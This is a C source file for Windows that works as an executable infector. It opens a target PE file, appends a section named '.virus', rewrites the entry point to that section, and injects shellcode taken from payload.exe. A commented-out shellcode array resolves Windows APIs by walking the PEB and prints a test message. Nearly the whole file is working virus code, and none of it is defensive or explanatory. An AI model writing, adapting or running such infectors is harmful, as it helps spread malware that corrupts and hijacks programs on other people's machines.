#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <Windows.h>

// BYTE payload[1024] = { // 0x400
// 	0x55, 0x48, 0x89, 0xE5, 0x48, 0x89, 0x4D, 0x10, 0x48, 0x89, 0x55, 0x18, 0xEB, 0x08, 0x48, 0xFF, 
// 	0x45, 0x10, 0x48, 0xFF, 0x45, 0x18, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x74, 
// 	0x12, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB6, 0x10, 0x48, 0x8B, 0x45, 0x18, 0x0F, 0xB6, 0x00, 0x38, 
// 	0xC2, 0x74, 0xDB, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xD0, 0x48, 0x8B, 0x45, 
// 	0x18, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xC0, 0x29, 0xC2, 0x89, 0xD0, 0x5D, 0xC3, 0x55, 0x48, 0x89, 
// 	0xE5, 0x48, 0x83, 0xEC, 0x10, 0x48, 0x89, 0x4D, 0x10, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x89, 0x45, 
// 	0xF8, 0xEB, 0x04, 0x48, 0xFF, 0x45, 0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 
// 	0x75, 0xF1, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x2B, 0x45, 0x10, 0x48, 0x83, 0xC4, 0x10, 0x5D, 0xC3, 
// 	0x55, 0x48, 0x89, 0xE5, 0x48, 0x89, 0x4D, 0x10, 0x48, 0x89, 0x55, 0x18, 0xEB, 0x0A, 0x48, 0x83, 
// 	0x45, 0x10, 0x02, 0x48, 0x83, 0x45, 0x18, 0x02, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB7, 0x00, 0x66, 
// 	0x85, 0xC0, 0x74, 0x13, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB7, 0x10, 0x48, 0x8B, 0x45, 0x18, 0x0F, 
// 	0xB7, 0x00, 0x66, 0x39, 0xC2, 0x74, 0xD7, 0x48, 0x8B, 0x45, 0x10, 0x0F, 0xB7, 0x00, 0x0F, 0xB7, 
// 	0xD0, 0x48, 0x8B, 0x45, 0x18, 0x0F, 0xB7, 0x00, 0x0F, 0xB7, 0xC0, 0x29, 0xC2, 0x89, 0xD0, 0x5D, 
// 	0xC3, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0xD0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x47, 0x65, 
// 	0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x48, 0x89, 0x45, 0xCB, 0xC7, 0x45, 0xD3, 0x6E, 0x64, 0x6C, 
// 	0x65, 0xC6, 0x45, 0xD7, 0x00, 0x48, 0xB8, 0x57, 0x72, 0x69, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x48, 
// 	0x89, 0x45, 0xBD, 0xC7, 0x45, 0xC5, 0x73, 0x6F, 0x6C, 0x65, 0x66, 0xC7, 0x45, 0xC9, 0x41, 0x00, 
// 	0x48, 0xB8, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x48, 0xBA, 0x74, 0x68, 0x65, 0x20, 
// 	0x70, 0x61, 0x79, 0x6C, 0x48, 0x89, 0x45, 0x90, 0x48, 0x89, 0x55, 0x98, 0x48, 0xB8, 0x6F, 0x61, 
// 	0x64, 0x21, 0x21, 0x21, 0x21, 0x21, 0x48, 0xBA, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 
// 	0x48, 0x89, 0x45, 0xA0, 0x48, 0x89, 0x55, 0xA8, 0x48, 0xB8, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 
// 	0x21, 0x21, 0x48, 0x89, 0x45, 0xB0, 0xC7, 0x45, 0xB8, 0x21, 0x21, 0x21, 0x00, 0x48, 0xB8, 0x4B, 
// 	0x00, 0x45, 0x00, 0x52, 0x00, 0x4E, 0x00, 0x48, 0xBA, 0x45, 0x00, 0x4C, 0x00, 0x33, 0x00, 0x32, 
// 	0x00, 0x48, 0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x95, 0x78, 0xFF, 0xFF, 0xFF, 0x48, 
// 	0xB8, 0x2E, 0x00, 0x44, 0x00, 0x4C, 0x00, 0x4C, 0x00, 0x48, 0x89, 0x45, 0x80, 0x66, 0xC7, 0x45, 
// 	0x88, 0x00, 0x00, 0x48, 0xB8, 0x00, 0x00, 0x7B, 0x82, 0xF8, 0x7F, 0x00, 0x00, 0x48, 0x89, 0x45, 
// 	0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x89, 0xC1, 0xE8, 0x32, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 
// 	0xF0, 0x48, 0x8B, 0x4D, 0xF8, 0x48, 0x8B, 0x55, 0xF0, 0x48, 0x8D, 0x45, 0xCB, 0x49, 0x89, 0xC8, 
// 	0x48, 0x89, 0xC1, 0xE8, 0x64, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x4D, 0xF8, 
// 	0x48, 0x8B, 0x55, 0xF0, 0x48, 0x8D, 0x45, 0xBD, 0x49, 0x89, 0xC8, 0x48, 0x89, 0xC1, 0xE8, 0x49, 
// 	0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0xE0, 0x48, 0x8B, 0x45, 0xE8, 0xB9, 0xF5, 0xFF, 0xFF, 0xFF, 
// 	0xFF, 0xD0, 0x48, 0x89, 0x45, 0xD8, 0x48, 0x8D, 0x45, 0x90, 0x48, 0x89, 0xC1, 0xE8, 0x4B, 0xFE, 
// 	0xFF, 0xFF, 0x41, 0x89, 0xC0, 0x48, 0x8D, 0x95, 0x6C, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x45, 0x90, 
// 	0x48, 0x8B, 0x4D, 0xD8, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x55, 
// 	0xE0, 0x49, 0x89, 0xD1, 0x48, 0x89, 0xC2, 0x41, 0xFF, 0xD2, 0x90, 0x48, 0x81, 0xC4, 0xD0, 0x00, 
// 	0x00, 0x00, 0x5D, 0xC3, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0x4D, 0x10, 
// 	0x48, 0x89, 0x55, 0x18, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x4F, 0x48, 0x8B, 0x45, 
// 	0x18, 0x48, 0x83, 0xE8, 0x10, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x83, 0xC0, 
// 	0x58, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x83, 0x7D, 0xE8, 0x00, 0x74, 0x1E, 
// 	0x48, 0x8B, 0x45, 0xE8, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x4D, 0x10, 0xE8, 0x00, 0xFE, 0xFF, 0xFF, 
// 	0x85, 0xC0, 0x75, 0x0A, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x8B, 0x40, 0x30, 0xEB, 0x14, 0x48, 0x8B, 
// 	0x45, 0x18, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0x18, 0xFF, 0x45, 0xFC, 0x83, 0x7D, 0xFC, 0x09, 
// 	0x7E, 0xAB, 0x48, 0x83, 0xC4, 0x40, 0x5D, 0xC3, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x10, 
// 	0x48, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 
// 	0x00, 0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x83, 0xC0, 
// 	0x20, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x83, 0xC4, 0x10, 0x5D, 0xC3, 0x55, 
// 	0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0x4D, 0x10, 0x48, 0x8B, 0x45, 0x10, 0x48, 
// 	0x89, 0x45, 0xF8, 0x48, 0x8B, 0x45, 0xF8, 0x8B, 0x40, 0x3C, 0x48, 0x98, 0x48, 0x8B, 0x55, 0x10, 
// 	0x48, 0x01, 0xD0, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 0xF0, 0x8B, 0x80, 0x88, 0x00, 0x00, 
// 	0x00, 0x89, 0x45, 0xEC, 0x8B, 0x45, 0xEC, 0x48, 0x8B, 0x55, 0x10, 0x48, 0x01, 0xD0, 0x48, 0x89, 
// 	0x45, 0xE0, 0x48, 0x8B, 0x45, 0xE0, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0x55, 0x48, 0x89, 0xE5, 
// 	0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0x4D, 0x10, 0x48, 0x89, 0x55, 0x18, 0x4C, 0x89, 0x45, 0x20, 
// 	0x48, 0x8B, 0x45, 0x18, 0x8B, 0x40, 0x20, 0x89, 0xC2, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x01, 0xD0, 
// 	0x48, 0x89, 0x45, 0xF0, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x32, 0x8B, 0x45, 0xFC, 
// 	0x48, 0x98, 0x48, 0x8D, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0x01, 
// 	0xD0, 0x8B, 0x00, 0x89, 0xC2, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x01, 0xD0, 0x48, 0x8B, 0x55, 0x10, 
// 	0x48, 0x89, 0xC1, 0xE8, 0x78, 0xFC, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0x13, 0xFF, 0x45, 0xFC, 0x48, 
// 	0x8B, 0x45, 0x18, 0x8B, 0x50, 0x14, 0x8B, 0x45, 0xFC, 0x39, 0xC2, 0x77, 0xC0, 0xEB, 0x01, 0x90, 
// 	0x48, 0x8B, 0x45, 0x18, 0x8B, 0x40, 0x24, 0x89, 0xC2, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x01, 0xD0, 
// 	0x48, 0x89, 0x45, 0xE8, 0x48, 0x8B, 0x45, 0x18, 0x8B, 0x40, 0x1C, 0x89, 0xC2, 0x48, 0x8B, 0x45, 
// 	0x20, 0x48, 0x01, 0xD0, 0x48, 0x89, 0x45, 0xE0, 0x8B, 0x45, 0xFC, 0x48, 0x98, 0x48, 0x8D, 0x14, 
// 	0x00, 0x48, 0x8B, 0x45, 0xE8, 0x48, 0x01, 0xD0, 0x0F, 0xB7, 0x00, 0x0F, 0xB7, 0xC0, 0x48, 0x8D, 
// 	0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xE0, 0x48, 0x01, 0xD0, 0x8B, 0x00, 0x89, 
// 	0xC2, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x01, 0xD0, 0x48, 0x83, 0xC4, 0x40, 0x5D, 0xC3, 0x90, 0x90
// };

typedef struct _payload_info_t
{
    BYTE *payload;
    int size;
}payload_info_t;


#define EXE_FILE_NAME (argv[1])
#define V_SECT_NAME ".virus"

#define BUFFER_SIZE 1024

typedef WINBOOL (*io_func)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset);

payload_info_t get_payload();



int main(int argc, char* argv[]) 
{   
    FILE *output = fopen("output.txt", "w");
    freopen("output.txt", "w", stdout);

    payload_info_t payload_info = get_payload();
    // payload_info_t payload_info = {payload, 1024};
    // exit(0);

    HANDLE file = CreateFile(EXE_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) 
    {
        puts("Failed to open.");
        exit(1);
    }

// get nt_header to write back
    IMAGE_DOS_HEADER i_dos_header = {0};
    io(ReadFile, (BYTE*)&i_dos_header, sizeof(i_dos_header), file, FILE_BEGIN, 0);
    IMAGE_NT_HEADERS i_nt_headers = {0};
    io(ReadFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);

    // printf("NumberOfSections: %d\n", i_nt_headers.FileHeader.NumberOfSections);
    // puts("Iterating through section headers...");

// get raw data size, NumberOfSections and the last header
    IMAGE_SECTION_HEADER i_sect_header = {0};
    int raw_data_size = 0;
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
        // puts(i_sect_header.Name);
        // printf("VirtualAddress: %X\n", i_sect_header.VirtualAddress);
        raw_data_size += i_sect_header.SizeOfRawData;
        // puts("");
    }
    puts("");
    
// Preparing for adding new section header
    // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
    int position = i_dos_header.e_lfanew 
        + sizeof(IMAGE_NT_HEADERS) 
        + i_nt_headers.FileHeader.NumberOfSections
        *sizeof(IMAGE_SECTION_HEADER); 
    // spare space of IMAGE_SECTION_HEADER
    int space = i_nt_headers.OptionalHeader.FileAlignment 
        - position % i_nt_headers.OptionalHeader.FileAlignment;
    int infect = (strcmp(V_SECT_NAME, i_sect_header.Name) != 0) 
        && (space >= sizeof(IMAGE_SECTION_HEADER)); 
    assert(infect);

// ADDING new section header: 
    int sect_start = position + space;  // start of original (host) codes
    int sect_end = sect_start + raw_data_size;  // end of original (host) codes

    DWORD payload_raw_size = ((payload_info.size / i_nt_headers.OptionalHeader.FileAlignment)
        + !!(payload_info.size % i_nt_headers.OptionalHeader.FileAlignment))
        *i_nt_headers.OptionalHeader.FileAlignment;
    DWORD PointerToRawData = sect_end;

// test
    // printf("sizeof(payload): %X\n",  sizeof(payload));
    // printf("payload_raw_size: %X\n", payload_raw_size);
    printf("FileAlignment: %X\n", i_nt_headers.OptionalHeader.FileAlignment);


    // i_sect_header is now the header of last section
    DWORD virus_v_addr = i_sect_header.VirtualAddress
        + i_sect_header.Misc.VirtualSize 
        + i_nt_headers.OptionalHeader.SectionAlignment 
        - i_sect_header.Misc.VirtualSize % i_nt_headers.OptionalHeader.SectionAlignment;

    DWORD Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    IMAGE_SECTION_HEADER new_sect_header = {
        V_SECT_NAME, 
        payload_info.size, 
        virus_v_addr, 
        payload_raw_size, // t
        PointerToRawData, // t
        0, 0, 0, 0, 
        Characteristics // t
    };

    io(WriteFile, (BYTE*)&new_sect_header, sizeof(new_sect_header), file, FILE_CURRENT, 0);
// END adding new section header()



// Updating nt_headers
    DWORD OriginalEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
    printf("OriginalEntryPoint: %X\n", OriginalEntryPoint);
    printf("virus_v_addr: %X\n", virus_v_addr);

    i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
    i_nt_headers.FileHeader.NumberOfSections++;
    i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
    // i_nt_headers.OptionalHeader.SizeOfCode += sizeof(IMAGE_SECTION_HEADER);
    i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
        + i_nt_headers.OptionalHeader.SectionAlignment 
        - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;

    io(WriteFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);
// END updating 



// print test for add new sect header 
    puts("After adding new sect header: ");
    SetFilePointer(file, i_dos_header.e_lfanew + sizeof(i_nt_headers), NULL, FILE_BEGIN);
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
        puts(i_sect_header.Name);
    }

    io(WriteFile, payload_info.payload, payload_info.size, file, FILE_BEGIN, sect_end);
}

void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset)
{
    DWORD bytesRead = 0;

    if (SetFilePointer(file, offset, NULL, offset_start) == INVALID_SET_FILE_POINTER)
    {
        puts("Err when set pointer");
        exit(1);
    }
    if (!operation(file, buffer, size, &bytesRead, NULL)) 
    {
        puts("Failed to read.");
        CloseHandle(file);
        exit(1);
    }
}

#define PAYLOAD_FILE_NAME "payload.exe"
#define PAYLOAD_SECT_NAME ".inject"

payload_info_t get_payload()
{
    FILE* payload_file = fopen(PAYLOAD_FILE_NAME, "rb");

    IMAGE_DOS_HEADER i_dos_header = {0};
    fread(&i_dos_header, 1, sizeof(i_dos_header), payload_file);
    fseek(payload_file, i_dos_header.e_lfanew, SEEK_SET);
    IMAGE_NT_HEADERS i_nt_headers = {0};
    fread(&i_nt_headers, 1, sizeof(i_nt_headers), payload_file);

    IMAGE_SECTION_HEADER i_sect_header = {0};
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        fread(&i_sect_header, 1, sizeof(i_sect_header), payload_file);
        if(strcmp(i_sect_header.Name, PAYLOAD_SECT_NAME) == 0)
        {
            break;
        }
    }
    fseek(payload_file, i_sect_header.PointerToRawData, SEEK_SET);
    BYTE *payload = (BYTE*)malloc(i_sect_header.Misc.VirtualSize);
    fread(payload, 1, i_sect_header.Misc.VirtualSize, payload_file);
    payload_info_t payload_info = {payload, i_sect_header.Misc.VirtualSize};
    return payload_info;
}

// code for print test:
// BYTE *ptr = (BYTE*)(&i_dos_header);
// for (int i = 0; i < sizeof(i_dos_header); i++)
// {
//     printf("%02X ", ptr[i]);
//     if ((i+1) % 0x10 ==  0)
//     {
//         puts("");
//     }
// }


// [+] Dump 0x401565 - 0x401567 (2 bytes) :
// unsigned char v_func[2] = {
//     0xB1, 0x56
// };